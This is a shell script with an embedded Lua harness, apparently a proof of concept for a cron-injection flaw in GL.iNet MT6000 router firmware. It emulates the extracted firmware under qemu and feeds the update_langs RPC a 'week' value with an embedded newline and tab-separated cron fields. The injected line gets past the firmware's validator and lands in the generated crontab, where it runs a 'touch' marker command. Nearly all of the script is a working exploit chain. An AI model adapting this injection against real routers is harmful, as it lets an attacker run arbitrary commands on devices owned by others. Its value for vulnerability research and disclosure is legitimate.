#!/bin/sh
set -eu

ROOT=${ROOT:-/mnt/e/competition/new_project_for_find_bug/analysis/GL.iNet/runtime_rootfs/GL-MT6000}
WORK=${WORK:-/tmp/glinet-ui-rpc-lua-harness}
MARKER=${MARKER:-/tmp/glinet_ui_rpc_timer_pwn}

rm -rf "$WORK"
mkdir -p "$WORK/config" "$WORK/etc/config/langs_bak" "$WORK/www/i18n" "$WORK/tmp" "$WORK/gl_crontabs/crontabs.d"
cp "$ROOT/etc/config/gl_timer" "$WORK/config/gl_timer"
printf '4.9.0\n' > "$WORK/etc/glversion"

cat > "$WORK/harness.lua" <<'LUA'
local root = os.getenv("ROOT")
local work = os.getenv("WORK")
local marker = os.getenv("MARKER")

package.path = root .. "/usr/lib/lua/?.lua;" ..
               root .. "/usr/lib/lua/?/init.lua;" ..
               root .. "/usr/share/lua/?.lua;" ..
               root .. "/usr/share/lua/?/init.lua;" ..
               package.path
package.cpath = root .. "/usr/lib/lua/?.so;" ..
                root .. "/usr/lib/lua/?/core.so;" ..
                package.cpath

local real_uci = require "uci"
package.loaded["uci"] = {
  cursor = function()
    return real_uci.cursor(work .. "/config")
  end
}

local function map_path(path)
  if path == "/etc/glversion" then return work .. "/etc/glversion" end
  if path == "/etc/config/gl_langs" then return work .. "/config/gl_langs" end
  if path == "/etc/config/langs_bak/" then return work .. "/etc/config/langs_bak/" end
  if path == "/etc/language_version" then return work .. "/etc/language_version" end
  if path:match("^/www/i18n") then return work .. path end
  return path
end

local function readfile(path, mode)
  local f = io.open(map_path(path), "r")
  if not f then return nil end
  local fmt = mode or "*a"
  if type(fmt) == "string" and fmt:sub(1, 1) ~= "*" then fmt = "*" .. fmt end
  local data = f:read(fmt)
  f:close()
  return data or ""
end

local function writefile(path, data, append)
  local f = io.open(map_path(path), append and "a" or "w")
  if not f then return nil end
  f:write(data or "")
  f:close()
  return true
end

package.loaded["oui.fs"] = {
  access = function(path)
    local f = io.open(map_path(path), "r")
    if f then f:close(); return true end
    local ok = os.execute("[ -e " .. string.format("%q", map_path(path)) .. " ]")
    return ok == true or ok == 0
  end,
  dir = function(path)
    local p = io.popen("find " .. string.format("%q", map_path(path)) .. " -maxdepth 1 -mindepth 1 -printf '%f\n' 2>/dev/null")
    return function()
      if not p then return nil end
      local line = p:read("*l")
      if not line then p:close(); p = nil end
      return line
    end
  end,
  readfile = readfile,
  writefile = writefile,
  sync = function() end
}

package.loaded["oui.utils"] = {
  readfile = readfile,
  writefile = writefile,
  get_model = function() return "mt6000" end,
  get_net_status = function() return true end,
  generate_id = function() return "sidstub" end
}

package.loaded["oui.ubus"] = { call = function() return nil end, send = function() end, objects = function() return {} end }
package.loaded["oui.db"] = { get_perm = function() return "r,w" end }
package.loaded["oui.rpc"] = {
  ERROR_CODE_NONE = 0,
  ERROR_CODE_ACCESS = -32000,
  ERROR_CODE_INVALID_PARAMS = -32602
}
package.loaded["lfactory"] = {}
package.loaded["hardware"] = {}
package.loaded["resty.http"] = { new = function() return {} end }
package.loaded["luatz"] = {}

local real_execute = os.execute
os.execute = function(cmd)
  if cmd == "touch /etc/config/gl_langs" then
    writefile("/etc/config/gl_langs", "")
    return 0
  elseif cmd == "mkdir /etc/config/langs_bak" then
    real_execute("mkdir -p " .. string.format("%q", work .. "/etc/config/langs_bak"))
    return 0
  end
  return real_execute(cmd)
end

ngx = {
  DEBUG = 0,
  ERR = 1,
  NOTICE = 2,
  log = function(...) end,
  pipe = {
    spawn = function(args)
      print("NGX_SPAWN=" .. table.concat(args, " "))
      return { wait = function() return true end }
    end
  },
  socket = { tcp = function() return { settimeout=function() end, connect=function() return false end, close=function() end } end },
  timer = { at = function(delay, fn) if fn then fn() end end },
  header = {}
}

local function valid_rpc_args(args, validator, is_array)
  local function table_is_array(t)
    local i = 0
    for k in pairs(t) do
      i = i + 1
      if k ~= i then return false end
    end
    return i > 0
  end
  local function validator_is_ok(vt)
    return type(vt) == "string" or type(vt) == "function"
  end
  for k, v in pairs(args) do
    if not is_array and not tostring(k):match("^[%a_-][%w_-]-") then return -32602 end
    if type(v) == "table" then
      local vt = validator and validator[k]
      if not vt and is_array and type(validator) == "table" then vt = validator end
      if type(vt) == "function" then
        if not vt(v) then return -32602 end
      else
        local r = valid_rpc_args(v, vt, table_is_array(v))
        if r ~= 0 then return r end
      end
    elseif type(v) == "string" then
      local vt
      if validator then
        if validator_is_ok(validator[k]) then vt = validator[k]
        elseif is_array and validator_is_ok(validator) then vt = validator end
      end
      vt = vt or "^[%w%.%s%-_:#/]-$"
      local ok = type(vt) == "string" and v:match(vt) or vt(v)
      if not ok then return -32602 end
    elseif type(v) ~= "number" and type(v) ~= "boolean" then
      return -32602
    end
  end
  return 0
end

local validator = dofile(root .. "/usr/share/gl-validator.d/ui.lua")
local method_validator = type(validator) == "table" and validator["update_langs"] or nil
if type(method_validator) ~= "table" then method_validator = nil end

local payload = "1\n0-59\t0-23\t1-31\t1-12\t0-6\ttouch\t" .. marker .. "\t#"
local args = {
  enable = true,
  hour = "0",
  min = "0",
  week = { payload },
  list = {}
}

local rc = valid_rpc_args(args, method_validator, false)
print("VALIDATOR_RC=" .. tostring(rc))
if rc ~= 0 then os.exit(1) end

local ui = dofile(root .. "/usr/lib/oui-httpd/rpc/ui")
local res = ui.update_langs(args)
print("UPDATE_LANGS_RESULT_TYPE=" .. type(res))

local c = real_uci.cursor(work .. "/config")
local week = c:get("gl_timer", "langs", "week") or ""
local hour = c:get("gl_timer", "langs", "hour") or ""
local min = c:get("gl_timer", "langs", "min") or ""
print("--- uci get week ---")
print((week:gsub("\t", "\\t")))

local sed_week = week:gsub(" ", ",")
local cron = min .. " " .. hour .. " * * " .. sed_week .. " gl_timer_control_langs 1 " .. sed_week .. " " .. hour .. " " .. min .. "\n"
writefile(work .. "/gl_crontabs/crontabs.d/langs", cron)
writefile(work .. "/gl_crontabs/root", cron)
print("--- generated cron ---")
local p = io.popen("sed -n l " .. string.format("%q", work .. "/gl_crontabs/root"))
print(p:read("*a"))
p:close()

local second = cron:match("\n([^\n]+)")
if not second then
  print("INJECTED_CRON_LINE_NOT_FOUND")
  os.exit(1)
end
local command = second:gsub("^%S+%s+%S+%s+%S+%s+%S+%s+%S+%s+", "")
real_execute(command)
local f = io.open(marker, "r")
if f then
  f:close()
  print("MARKER_CREATED=" .. marker)
  os.remove(marker)
else
  print("MARKER_NOT_CREATED=" .. marker)
  os.exit(1)
end
LUA

ROOT="$ROOT" WORK="$WORK" MARKER="$MARKER" qemu-aarch64 \
  -L "$ROOT" \
  -E ROOT="$ROOT" \
  -E WORK="$WORK" \
  -E MARKER="$MARKER" \
  -E LUA_PATH="$ROOT/usr/lib/lua/?.lua;$ROOT/usr/lib/lua/?/init.lua;;" \
  -E LUA_CPATH="$ROOT/usr/lib/lua/?.so;$ROOT/usr/lib/lua/?/core.so;;" \
  "$ROOT/usr/bin/lua5.1" "$WORK/harness.lua"
